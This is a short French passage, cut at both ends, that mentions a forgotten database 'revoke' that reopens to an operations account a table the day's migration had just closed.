et un `revoke` oublié qui rouvre à un compte d'exploitation la table que la migration du
jour venait de refermer.
